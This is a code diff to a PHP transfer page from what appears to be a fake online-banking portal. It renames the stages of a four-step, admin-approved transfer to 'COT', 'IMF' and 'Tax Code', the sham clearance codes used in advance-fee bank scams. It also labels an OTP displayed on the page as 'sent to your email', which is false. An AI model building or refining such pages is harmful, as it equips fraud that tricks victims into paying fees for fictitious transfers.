@@ -56,7 +56,7 @@ require __DIR__.'/partials/header.php';require __DIR__.'/partials/sidebar.php';
   <div class="card-body p-4">
     <!-- 4-stage stepper -->
     <div class="d-flex justify-content-between mb-4 flex-wrap gap-2">
-      <?php foreach([1=>t('Identity'),2=>t('Amount'),3=>t('Beneficiary'),4=>t('Final')] as $n=>$label):
+      <?php foreach([1=>t('COT'),2=>t('IMF'),3=>t('Tax Code'),4=>t('Final')] as $n=>$label):
         $done=$n<=$approvedCount;
         $submittedNow=$stageSubmitted&&$n===$currentStage;
         $active=$status==='pending'&&$n===$currentStage&&!$stageSubmitted;
@@ -109,7 +109,7 @@ require __DIR__.'/partials/header.php';require __DIR__.'/partials/sidebar.php';
         <p class="small mb-2"><?=e(t('Enter the 6-digit OTP to pass this stage. Each stage is verified by you, then approved by an administrator before the next one unlocks.'))?></p>
         <?php if($details['otp_challenge']):?><div class="small"><?=e(t('Expires:'))?> <?=e($details['otp_challenge']['expires_at'])?> · <?=e(t('Attempts:'))?> <?=e((string)$details['otp_challenge']['attempts'])?>/5</div><?php endif;?>
       </div>
-      <?php if($displayOtp):?><div class="alert alert-warning"><strong><?=e(t('One-Time Password'))?> (<?=e(t('Stage'))?> <?=$currentStage?>):</strong> <span class="fs-4 fw-bold font-monospace"><?=e($displayOtp)?></span></div><?php endif;?>
+      <?php if($displayOtp):?><div class="alert alert-warning"><strong><?=e(t('One-Time Password'))?> — <?=e(t('Stage'))?> <?=$currentStage?> (<?=e(t('sent to your email'))?>):</strong> <span class="fs-4 fw-bold font-monospace"><?=e($displayOtp)?></span></div><?php endif;?>
       <form method="post" class="mt-3"><?=csrf_field()?>
         <input type="hidden" name="reference" value="<?=e($ref)?>"><input type="hidden" name="action" value="confirm">
         <label class="form-label fw-semibold"><?=e(t('Enter OTP'))?> — <?=e(t(TransferService::stageLabel($currentStage)))?></label>
